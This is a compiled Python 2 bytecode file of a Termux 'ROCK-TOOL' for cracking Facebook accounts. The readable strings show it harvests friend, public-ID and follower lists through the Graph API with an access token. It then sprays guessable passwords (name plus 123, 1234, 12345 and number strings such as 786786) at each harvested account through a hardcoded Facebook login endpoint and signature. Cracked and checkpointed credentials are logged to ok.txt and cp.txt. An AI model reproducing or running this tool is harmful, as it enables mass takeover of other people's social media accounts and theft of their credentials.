ó
 üac           @   s2  y° d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z Wn_ e k
 re  j d  e  j d  e  j d  e  j d  e  j d  e  j d  n Xy e  j d	  Wn e k
 r³e  j j d
  r°e  j d  e  j d  e  j d  e  j d  e  j d  e  j d  e  j d  e  j d  n  n Xd  d l m Z e j d d  Z e j d d  Z i e e  d 6e e  d 6e e  d 6d d 6d d 6d d 6d d 6d d 6Z e e  e j d   d!   Z d"   Z d#   Z  d$   Z! d%   Z" d& Z# g  Z$ d'   Z% d(   Z& d)   Z' d*   Z( d+   Z) d,   Z* d-   Z+ d.   Z, d/   Z- d0   Z. d1   Z/ d2   Z0 d3   Z1 d4   Z2 d5   Z3 d6   Z4 e5 d7 k r.e%   n  d S(8   iÿÿÿÿN(   t
   ThreadPools   pkg install python -ys   pip install requestss   pip install mechanizes   pip2 install nodejss   pip2 install npms   python2 ab.pyt   saves   .../index.jst   #s   fuser -k 5000/tcp &s   node ...../index.js &(   t   ConnectionErrorg    ÐsAg    8|Ag     Ó@g     ã@s   x-fb-connection-bandwidths   x-fb-sim-hnis   x-fb-net-hnit	   EXCELLENTs   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-typesº   Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]s
   user-agents!   application/x-www-form-urlencodeds   content-typet   Ligers   x-fb-http-enginet   utf8c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¸ëQ¸?(   t   syst   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/world.pyt   abmE   s    c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s   [1;32m[+] Logging In[0;97m i   (   R   R   R
   R   R   (   t   titikt   o(    (    s   /sdcard/world.pyt   loggingQ   s
      c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s    [1;32m[+] Saving Token[0;97m i   (   R   R   R
   R   R   (   R   R   (    (    s   /sdcard/world.pyt   savingY   s
      c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s#   [1;32m[+] Getting Updates[0;32m i   (   R   R   R
   R   R   (   R   R   (    (    s   /sdcard/world.pyt	   updateinga   s
      c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s   [1;32m[+] Logging Out[0;97m i   (   R   R   R
   R   R   (   R   R   (    (    s   /sdcard/world.pyt   logouti   s
      s  

[1;32m
[1;32m         /$$$$$$$  /$$$$$$$   /$$$$$$ 
[1;32m        | $$__  $$| $$__  $$ /$$__  $$
[1;32m        | $$  \ $$| $$  \ $$| $$  \ $$
[1;32m        | $$$$$$$/| $$$$$$$/| $$  | $$
[1;32m        | $$____/ | $$__  $$| $$  | $$
[1;32m        | $$      | $$  \ $$| $$  | $$
[1;32m        | $$      | $$  | $$|  $$$$$$/
[1;32m        |__/      |__/  |__/ \______/ 
[1;0m

[1;32m--------------------------------------------------
[1;32mâ¤[1;32m Author   : ROCK-17

[1;32mâ¤[1;32m Github   : https://github.com/ROCK-17

[1;32mâ¤[1;32m Fb Id  : https://facebook.com/Rock-Back.Ded
[1;32m--------------------------------------------------
c          C   sn  t  j d  t GHd j d  GHd GHd GHt d  }  |  d k r<t  j d  t GHd GHt d	  } | d
 k rÒ t  j d  t GHt   t  j d  t GHd GHd GHd GHt j d  d GHd GHt j d  n  y t d d  t	   Wn t
 t f k
 r
t   qjXd | d GHt  j d  t j d  t   n. d |  d GHt  j d  t j d  t   d  S(   Nt   clears   [1;93mFirst Tool logini2   t    s9   [1;32m--------------------------------------------------s$   [1;97m[+][1;32m Username :[1;32m t   Rocks   [+] Username : Rock (Correct)s$   [1;32m[+][1;32m Password :[1;32m t   17s2   [1;32m[+][1;32m Username : Rock[1;32m (Correct)s0   [1;32m[+][1;32m Password : 17[1;32m (Correct)i   s$   	 [1;32m[+] Login Successful[0;32ms
   .login.txtt   rs   	 [!] Password : s    (Wrong)s=   xdg-open https://youtube.com/channel/UC0THSsatx1wtKUM_A_L0Tngs   	 [!] Username : (   t   ost   systemt   logot   centert	   raw_inputR   R   R   t   opent   menut   KeyErrort   IOErrort   login_choicet   tech_abm(   t   usernamet
   passwordss(    (    s   /sdcard/world.pyR%      sJ    
c           C   sK   t  j d  t GHt  j d  t  j d  t GHd GHd GHd GHt   d  S(   NR   s   python3 .loading.mdsX   [1;32m[3][1;32m-â-[1;32mClone Friendlist and Public ID [1;32m([1;32mLogin[1;32m)s!   [1;32m[0][1;32m-â-[1;32mExits9   [1;32m--------------------------------------------------(   R   R   R   t
   clone_main(    (    (    s   /sdcard/world.pyR$   ×   s    c          C   s®   t  d  }  |  d k r< t j d  t j d  t   n  |  d k rl t j d  t j d  t   n  |  d k r t   n( |  d k r t j d	  n d
 GHt   d  S(   Ns   
â°ââ£ t   1s   python2 .name.mdi   t   2s   python2 .nbr.mdt   3t   0t   exits   [1;32mFill in correctly(   R   R   R   R   R   R!   t   loginviaR(   (   t   hack(    (    s   /sdcard/world.pyR(   ë   s    


c           C   sP   t  j d  t GHt  j d  t  j d  t GHd GHd GHd GHd GHt   d  S(   NR   s   python3 .loading.mds5   [1;32m[1][1;32m-â-[1;32mlogin With Access Token s5   [1;32m[2][1;32m-â-[1;32mLogin With User And Passs!   [1;32m[0][1;32m-â-[1;32mBacks9   [1;32m--------------------------------------------------(   R   R   R   t   clone_loginvia(    (    (    s   /sdcard/world.pyR.     s    c          C   s  t  d  }  |  d k rÈ t j d  t GHt j d  t j d  t GHd j d  GHd GHt  d  } d GHt   t d	 d
  } | j |  | j   t	 d  t j d  t
 j d  t   n8 |  d k rÞ t   n" |  d k rô t   n d GHt   d  S(   Ns   
â°ââ£ R)   R   s   python3 .loading.mds   [1;32mLogin With Tokeni2   s9   [1;32m--------------------------------------------------s!   [1;97m[+][1;32m Paste :[1;32m s
   .login.txtt   ws&   [1;32m[â] Login Successfull[0;32ms=   xdg-open https://youtube.com/channel/UC0THSsatx1wtKUM_A_L0Tngi   R*   R,   s    [!] Please Select a Valid Option(   R   R   R   R   R   R   R    R	   t   closeR   R   R   R!   t   loginfbR0   (   R/   t   tokent   sav(    (    s   /sdcard/world.pyR0   #  s2    




c          C   s  t  j d  t GHt  j d  t j d  t  j d  t GHd j d  GHd j d  GHd GHt d  }  |  j d	 d
  } | j d d
  } | j d d
  } t d  } d GHt   t	 j
 d | d | d d t j } t j |  } d | k rBt d d  } | j | d  | j   d GHt j d  t   nE d | d k rnd GHt j d  t   n d GHt j d  t   d  S(   NR   s   python3 .loading.mdi   s)   [1;32mLogin With Facebook Account[1;32mi2   s)   [1;32mUse Proxy to login account [1;32ms9   [1;32m--------------------------------------------------s+   [1;32m[+][1;32m Email/ID/Number :[1;32m t    R   t   (t   )s$   [1;32m[+][1;32m Password :[1;32m s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   headerst   access_tokens
   .login.txtR1   s&   
[1;32m[â] Login Successfull[0;32ms   www.facebook.comt	   error_msgs:   
[1;32m[!] Login Failed . Account Has a Checkpoint[0;32msH   
[1;32m[!] Login Failed.Email/ID/Number OR Password May BE Wrong[0;32m(   R   R   R   R   R   R   R   t   replaceR   t   requestst   gett   headert   textt   jsont   loadsR    R	   R2   R!   R3   (   t   idt   id1t   id2t   uidt   pwdt   datat   qt   succ(    (    s   /sdcard/world.pyR3   Y  s@    (


c          C   sH  t  j d  y t d d  j   }  Wn< t k
 rd t GHd GHt  j d  t j d  t   n Xy9 t	 j
 d |  d t } t j | j  } | d	 } WnI t k
 ré t  j d  t GHd
 GHt  j d  t j d  t   n Xt  j d  t GHt  j d  t  j d  t GHd | GHd GHd GHd GHd GHd GHt   d  S(   NR   s
   .login.txtR   s   [!] Error 404.Token Not Founds   rm -rf .login.txti   s+   https://graph.facebook.com/me?access_token=R9   t   names9   [1;32m[!] Loading Failed . Your Account Has a Checkpoints   python3 .loading.mds   	  [1;32m[+] Name : s9   [1;32m--------------------------------------------------s:   [1;32m[1][1;32m-â-[1;32mClone Frienlist and Public IDs7   [1;32m[2][1;32m-â-[1;32mClone Bangladesh and Indias"   [132m[0][1;32m-â-[1;32mlogout(   R   R   R    t   readR#   R   R   R   R$   R=   R>   R?   RA   RB   R@   R"   t   menu_select(   R4   R   t   aRK   (    (    s   /sdcard/world.pyR!     s@    	c          C   s   t  d  }  |  d k r" t   n  |  d k r8 t   nN |  d k rz t   t j d  t j d  d GHt j d  n d	 GHt   d  S(
   Ns   
â°ââ£ R)   R*   R,   s   rm -rf .login.txti   s+   [1;32m[â] Logged Out Successfully[0;32mR-   s    [!] Please Select a Valid Option(	   R   t   crackt   bangla_indiaR   R   R   R   R   RM   (   t   option(    (    s   /sdcard/world.pyRM   à  s    

c           C   sµ   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHt  j d  t  j d  t	 GHd GHd	 GHd
 GHd GHd GHt
   d  S(   NR   s
   .login.txtR   s   [!] Error 404 . Token Not Founds   rm -rf .login.txti   s   python3 .loading.mds3   [1;32m[1][1;32m-â-[1;32mCrack From Friend Lists1   [1;32m[2][1;32m-â-[1;32mCrack From Public IDs1   [1;32m[3][1;32m-â-[1;32mCrack From Followerss!   [1;32m[0][1;32m-â-[1;32mBacks9   [1;32m--------------------------------------------------(   R   R   R    RL   R4   R#   R   R   t   loginR   t   crack2(    (    (    s   /sdcard/world.pyRO      s&    c             s  t  d  }  g  } g   g    |  d k rÅ t j d  t GHd GHd GHt j d t d t } t j	 | j
  } xN | d D]B } | d	 } | d
 } | j d  d } | j | d |  q| Wn¶|  d k rt j d  t GHd GHd GHt  d  } d GHt j d  t GHyD t j d | d t d t } t j	 | j
  }	 d |	 d
 GHWn/ t k
 rd | d GHt  d  t   n Xt j d | d t d t } t j	 | j
  } xN | d D]B }
 |
 d	 } |
 d
 } | j d  d } | j | d |  qÄWnn|  d k rYt j d  t GHd GHd GHt  d  } d GHt j d  t GHyD t j d | d t d t } t j	 | j
  }	 d |	 d
 GHWn/ t k
 rÍd | d GHt  d  t   n Xt j d | d t d d t } t j	 | j
  } xN | d D]B }
 |
 d	 } |
 d
 } | j d  d } | j | d |  qWn" |  d k rot   n d GHt   d t t |   GHd  GHd GH   f d!   } t d"  } | j | |  d GHd# GHd$ t t     d% t t    GHd GHt  d&  t   d  S('   Ns   
â°ââ£ R)   R   s%   	[1;32m  Clone From Frienlist[1;32ms9   [1;32m--------------------------------------------------s3   https://graph.facebook.com/me/friends?access_token=R9   RH   RC   RK   R6   i    t   |R*   s$   	[1;32m  Clone From Public ID[1;0ms$   [1;32m[+][1;32m Input ID :[1;32m s   https://graph.facebook.com/s   ?access_token=s   [â] Account Name : s   
[!] Error 404 . ID Link s+    Have Privacy On Friendlist OR IS Not Valids   
Press Enter To Back s   /friends?access_token=R+   s$   	[1;32m  Clone From Followers[1;0ms%    Donot Have Followers OR IS Not Valids   /subscribers?access_token=s   &limit=5000R,   s    [!] Please Select a Valid Options%   [1;32m[+][1;32m Total IDs :[1;32m sD   [1;32m[+][1;32m Cloning Starting By ROCK-TOOL waiting Places[1;0mc            s¦  |  } | j  d  \ } } y}| d } t j d | d | d d t j } t j |  } d | d k rÊ d	 | d
 | d
 | GHt d d  } | j | d | d  | j	     j
 |  nÍd | k r1d | d | d | GHt d d  } | j | d | d  | j	    j
 |  nf| d }	 t j d | d |	 d d t j } t j |  } d | d k rÝd	 | d
 |	 d
 | GHt d d  } | j | d |	 d  | j	     j
 |  nºd | k rDd | d |	 d | GHt d d  } | j | d |	 d  | j	    j
 |  nS| d }
 t j d | d |
 d d t j } t j |  } d | d k rðd	 | d
 |
 d
 | GHt d d  } | j | d |
 d  | j	     j
 |  n§d | k rWd | d |
 d | GHt d d  } | j | d |
 d  | j	    j
 |  n@| d } t j d | d | d d t j } t j |  } d | d k rd	 | d
 | d
 | GHt d d  } | j | d | d  | j	     j
 |  nd | k rjd | d | d | GHt d d  } | j | d | d  | j	    j
 |  n-d } t j d | d | d d t j } t j |  } d | d k rd	 | d
 | d
 | GHt d d  } | j | d | d  | j	     j
 |  nd | k ryd | d | d | GHt d d  } | j | d | d  | j	    j
 |  nd } t j d | d | d d t j } t j |  } d | d k r!d	 | d
 | d
 | GHt d d  } | j | d | d  | j	     j
 |  nvd | k rd | d | d | GHt d d  } | j | d | d  | j	    j
 |  nd } t j d | d | d d t j } t j |  } d | d k r0d	 | d
 | d
 | GHt d d  } | j | d | d  | j	     j
 |  ng d | k rd | d | d | GHt d d  } | j | d | d  | j	    j
 |  n  Wn n Xd  S(   NRT   t   123s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=vi_vn&password=sH   &sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705cR9   s   www.facebook.comR;   s&   [1;97m[[1;93mROCK-CP[1;97m][1;97m s   [1;91m | [1;97ms   cp.txtRN   s    | s   
R:   s   	[1;92m[ROCK-OK] s   ok.txtt   1234t   12345t   786786t   445566t   100200(   t   splitR=   R>   R?   R@   RA   RB   R    R	   R2   t   append(   t   argt   userRF   RK   t   pass1RI   t   dt   cpt   okt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7(   t   cpst   oks(    s   /sdcard/world.pyt   mainÂ  sÜ    
(


(


(


(

(

(

(

i   s,   [1;32m[+][1;32m Process Has Been Completeds'   [1;32m[+][1;32m Total CP/OK:[0;32m  s	   /[1;32m s   Press Enter To Main Menu Back(   R   R   R   R   R=   R>   R4   R?   RA   RB   R@   t   rsplitR\   R"   RO   R!   RS   t   strt   lenR    t   map(   t   selectRC   R   R   t   sRF   t   nat   nmt   idtRI   t   iRk   t   p(    (   Ri   Rj   s   /sdcard/world.pyRS   *  s¢    

!
!

!
%


ÿ )
c           C   sP   t  j d  t GHt  j d  t  j d  t GHd GHd GHd GHd GHt   d  S(   NR   s   python3 .loading.mds6   [1;32m[1][1;32m-â-[1;32mRandom Bangladesh Clonings1   [1;32m[2][1;32m-â-[1;32mRandom India Clonings    [1;32m[0][1;32m-â-[1;3mBacks9   [1;32m--------------------------------------------------(   R   R   R   t   bangla_india_man(    (    (    s   /sdcard/world.pyRP   Ô  s    c          C   s^   t  d  }  |  d k r" t   n  |  d k r8 t   n  |  d k rN t   n d GHt   d  S(   Ns   
â°ââ£ R)   R*   R,   s    [!] Please Select a Valid Option(   R   t   banglat   indiaaR!   Rw   (   RQ   (    (    s   /sdcard/world.pyRw   ê  s    


c           C   s¿   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHt  j d  t  j d  t	 GHd GHd	 GHd
 GHd GHd GHd GHd	 GHt
   d  S(   NR   s
   .login.txtR   s   [!] Error 404 . Token Not Founds   rm -rf .login.txti   s   python3 .loading.mds   	   Bangladesh Menus8   [1;3m--------------------------------------------------s0   [1;3m[1][1;3m-â-[1;3mCrack From Friend Lists.   [1;3m[2][1;3m-â-[1;3mCrack From Public IDs.   [1;3m[3][1;3m-â-[1;3mCrack From Followerss   [1;3m[0][1;3m-â-[1;3mBack(   R   R   R    RL   R4   R#   R   R   RR   R   t   bangla2(    (    (    s   /sdcard/world.pyRx     s*    c             s  t  d  }  g  } g   g    |  d k rÅ t j d  t GHd GHd GHt j d t d t } t j	 | j
  } xN | d D]B } | d	 } | d
 } | j d  d } | j | d |  q| Wn¶|  d k rt j d  t GHd GHd GHt  d  } d GHt j d  t GHyD t j d | d t d t } t j	 | j
  }	 d |	 d
 GHWn/ t k
 rd | d GHt  d  t   n Xt j d | d t d t } t j	 | j
  } xN | d D]B }
 |
 d	 } |
 d
 } | j d  d } | j | d |  qÄWnn|  d k rYt j d  t GHd GHd GHt  d  } d GHt j d  t GHyD t j d | d t d t } t j	 | j
  }	 d |	 d
 GHWn/ t k
 rÍd | d GHt  d  t   n Xt j d | d t d d t } t j	 | j
  } xN | d D]B }
 |
 d	 } |
 d
 } | j d  d } | j | d |  qWn" |  d k rot   n d GHt   d t t |   GHd  GHd GH   f d!   } t d"  } | j | |  d GHd# GHd$ t t     d% t t    GHd GHt  d&  t   d  S('   Ns   
â°ââ£ R)   R   s$   	[1;32m  Clone From Frienlist[1;0ms9   [1;32m--------------------------------------------------s3   https://graph.facebook.com/me/friends?access_token=R9   RH   RC   RK   R6   i    RT   R*   s%   	[1;32m  Clone From Public ID[1;32ms-   [1;32m[+][1;32m Input ID/Username :[1;32m s   https://graph.facebook.com/s   ?access_token=s   [â] Account Name : s   
[!] Error 404 . ID Link s+    Have Privacy On Friendlist OR IS Not Valids   
Press Enter To Back s   /friends?access_token=R+   s%   	[1;32m  Clone From Followers[1;32ms%    Donot Have Followers OR IS Not Valids   /subscribers?access_token=s   &limit=5000R,   s    [!] Please Select a Valid Options%   [1;32m[+][1;32m Total IDs :[1;32m s?   [1;32m[+][1;32m Cloning Starting ROCK-TOOL Places Wait[1;32mc            s¦  |  } | j  d  \ } } y}| d } t j d | d | d d t j } t j |  } d | d k rÊ d	 | d
 | d
 | GHt d d  } | j | d | d  | j	     j
 |  nÍd | k r1d | d | d | GHt d d  } | j | d | d  | j	    j
 |  nf| d }	 t j d | d |	 d d t j } t j |  } d | d k rÝd	 | d
 |	 d
 | GHt d d  } | j | d |	 d  | j	     j
 |  nºd | k rDd | d |	 d | GHt d d  } | j | d |	 d  | j	    j
 |  nS| d }
 t j d | d |
 d d t j } t j |  } d | d k rðd	 | d
 |
 d
 | GHt d d  } | j | d |
 d  | j	     j
 |  n§d | k rWd | d |
 d | GHt d d  } | j | d |
 d  | j	    j
 |  n@| d } t j d | d | d d t j } t j |  } d | d k rd	 | d
 | d
 | GHt d d  } | j | d | d  | j	     j
 |  nd | k rjd | d | d | GHt d d  } | j | d | d  | j	    j
 |  n-d } t j d | d | d d t j } t j |  } d | d k rd	 | d
 | d
 | GHt d d  } | j | d | d  | j	     j
 |  nd | k ryd | d | d | GHt d d  } | j | d | d  | j	    j
 |  nd } t j d | d | d d t j } t j |  } d | d k r!d	 | d
 | d
 | GHt d d  } | j | d | d  | j	     j
 |  nvd | k rd | d | d | GHt d d  } | j | d | d  | j	    j
 |  nd } t j d | d | d d t j } t j |  } d | d k r0d	 | d
 | d
 | GHt d d  } | j | d | d  | j	     j
 |  ng d | k rd | d | d | GHt d d  } | j | d | d  | j	    j
 |  n  Wn n Xd  S(   NRT   RU   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=vi_vn&password=sH   &sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705cR9   s   www.facebook.comR;   s&   [1;97m[[1;93mROCK-CP[1;97m][1;97m s   [1;91m | [1;97ms   cp.txtRN   s    | s   
R:   s   [1;92m[ROCK-OK] s   ok.txtRV   RW   t   786RX   t   654321t   098765(   R[   R=   R>   R?   R@   RA   RB   R    R	   R2   R\   (   R]   R^   RF   RK   R_   RI   R`   Ra   Rb   Rc   Rd   Re   Rf   Rg   Rh   (   Ri   Rj   (    s   /sdcard/world.pyRk   È  sÜ    
(


(


(


(

(

(

(

i   s,   [1;32m[+][1;32m Process Has Been Completeds'   [1;32m[+][1;32m Total CP/OK:[0;32m  s	   /[1;32m s   Press Enter To Main Menu Back(   R   R   R   R   R=   R>   R4   R?   RA   RB   R@   Rl   R\   R"   RO   R!   Rz   Rm   Rn   R    Ro   (   Rp   RC   R   R   Rq   RF   Rr   Rs   Rt   RI   Ru   Rk   Rv   (    (   Ri   Rj   s   /sdcard/world.pyRz   0  s¢    

!
!

!
%


ÿ )
c           C   s¿   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHt  j d  t  j d  t	 GHd GHd	 GHd
 GHd GHd GHd GHd	 GHt
   d  S(   NR   s
   .login.txtR   s   [!] Error 404 . Token Not Founds   rm -rf .login.txti   s   python3 .loading.mds   	   India Menus9   [1;32m--------------------------------------------------s2   [1;32m[1][1;32m-â-[1;3mCrack From Friend Lists0   [1;32m[2][1;32m-â-[1;3mCrack From Public IDs0   [1;32m[3][1;32m-â-[1;3mCrack From Followerss    [1;32m[0][1;32m-â-[1;3mBack(   R   R   R    RL   R4   R#   R   R   RR   R   t   indiaa2(    (    (    s   /sdcard/world.pyRy   Ú  s*    c             s  t  d  }  g  } g   g    |  d k rÅ t j d  t GHd GHd GHt j d t d t } t j	 | j
  } xN | d D]B } | d	 } | d
 } | j d  d } | j | d |  q| Wn¶|  d k rt j d  t GHd GHd GHt  d  } d GHt j d  t GHyD t j d | d t d t } t j	 | j
  }	 d |	 d
 GHWn/ t k
 rd | d GHt  d  t   n Xt j d | d t d t } t j	 | j
  } xN | d D]B }
 |
 d	 } |
 d
 } | j d  d } | j | d |  qÄWnn|  d k rYt j d  t GHd GHd GHt  d  } d GHt j d  t GHyD t j d | d t d t } t j	 | j
  }	 d |	 d
 GHWn/ t k
 rÍd | d GHt  d  t   n Xt j d | d t d d t } t j	 | j
  } xN | d D]B }
 |
 d	 } |
 d
 } | j d  d } | j | d |  qWn" |  d k rot   n d GHt   d  t t |   GHd! GHd GH   f d"   } t d#  } | j | |  d GHd$ GHd% t t     d& t t    GHd GHt  d'  t   d  S((   Ns   
â°ââ£ R)   R   s$   	[1;32m  Clone From Frienlist[1;3ms9   [1;32m--------------------------------------------------s3   https://graph.facebook.com/me/friends?access_token=R9   RH   RC   RK   R6   i    RT   R*   s%   	[1;32m  Clone From Public ID[1;32ms-   [1;32m[+][1;32m Input ID/Username :[1;32m s   https://graph.facebook.com/s   ?access_token=s   [â] Account Name : s   
[!] Error 404 . ID Link s+    Have Privacy On Friendlist OR IS Not Valids   
Press Enter To Back s   /friends?access_token=R+   s%   	[1;32m  Clone From Followers[1:32ms,   [1;32m[+][1;3m Input ID/Username :[1;32m s%    Donot Have Followers OR IS Not Valids   /subscribers?access_token=s   &limit=5000R,   s    [!] Please Select a Valid Options%   [1;32m[+][1;32m Total IDs :[1;32m s>   [1;32m[+][1;32m Cloning Starting ROCK-TOOL Places Wait[1;3mc            s¦  |  } | j  d  \ } } y}| d } t j d | d | d d t j } t j |  } d | d k rÊ d	 | d
 | d
 | GHt d d  } | j | d | d  | j	     j
 |  nÍd | k r1d | d | d | GHt d d  } | j | d | d  | j	    j
 |  nf| d }	 t j d | d |	 d d t j } t j |  } d | d k rÝd	 | d
 |	 d
 | GHt d d  } | j | d |	 d  | j	     j
 |  nºd | k rDd | d |	 d | GHt d d  } | j | d |	 d  | j	    j
 |  nS| d }
 t j d | d |
 d d t j } t j |  } d | d k rðd	 | d
 |
 d
 | GHt d d  } | j | d |
 d  | j	     j
 |  n§d | k rWd | d |
 d | GHt d d  } | j | d |
 d  | j	    j
 |  n@| d } t j d | d | d d t j } t j |  } d | d k rd	 | d
 | d
 | GHt d d  } | j | d | d  | j	     j
 |  nd | k rjd | d | d | GHt d d  } | j | d | d  | j	    j
 |  n-d } t j d | d | d d t j } t j |  } d | d k rd	 | d
 | d
 | GHt d d  } | j | d | d  | j	     j
 |  nd | k ryd | d | d | GHt d d  } | j | d | d  | j	    j
 |  nd } t j d | d | d d t j } t j |  } d | d k r!d	 | d
 | d
 | GHt d d  } | j | d | d  | j	     j
 |  nvd | k rd | d | d | GHt d d  } | j | d | d  | j	    j
 |  nd } t j d | d | d d t j } t j |  } d | d k r0d	 | d
 | d
 | GHt d d  } | j | d | d  | j	     j
 |  ng d | k rd | d | d | GHt d d  } | j | d | d  | j	    j
 |  n  Wn n Xd  S(   NRT   RU   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=vi_vn&password=sH   &sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705cR9   s   www.facebook.comR;   s&   [1;97m[[1;93mROCK-CP[1;97m][1;97m s   [1;91m | [1;97ms   cp.txtRN   s    | s   
R:   s   [1;92m[ROCK-OK] s   ok.txtRV   RW   t   098t   556677t   334455(   R[   R=   R>   R?   R@   RA   RB   R    R	   R2   R\   (   R]   R^   RF   RK   R_   RI   R`   Ra   Rb   Rc   Rd   Re   Rf   Rg   Rh   (   Ri   Rj   (    s   /sdcard/world.pyRk      sÜ    
(


(


(


(

(

(

(

i   s,   [1;32m[+][1;32m Process Has Been Completeds'   [1;32m[+][1;32m Total CP/OK:[0;32m  s	   /[1;32m s   Press Enter To Main Menu Back(   R   R   R   R   R=   R>   R4   R?   RA   RB   R@   Rl   R\   R"   RO   R!   R~   Rm   Rn   R    Ro   (   Rp   RC   R   R   Rq   RF   Rr   Rs   Rt   RI   Ru   Rk   Rv   (    (   Ri   Rj   s   /sdcard/world.pyR~     s¢    

!
!

!
%


ÿ )
t   __main__(6   R   R   R   t   datetimet   randomt   hashlibt   ret	   threadingRA   t   getpasst   urllibt	   cookielibR=   t   multiprocessing.poolR    t   ImportErrorR   t   mkdirt   OSErrort   patht   isfilet   requests.exceptionsR   t   randintt   bdt   simt   reprR?   t   reloadt   setdefaultencodingR   R   R   R   R   R   t   idhR%   R$   R(   R.   R0   R3   R!   RM   RO   RS   RP   Rw   Rx   Rz   Ry   R~   t   __name__(    (    (    s   /sdcard/world.pyt   <module>   sn   P
						M		"		6	F	A	 	*	ÿ «			.	ÿ «	.	ÿ «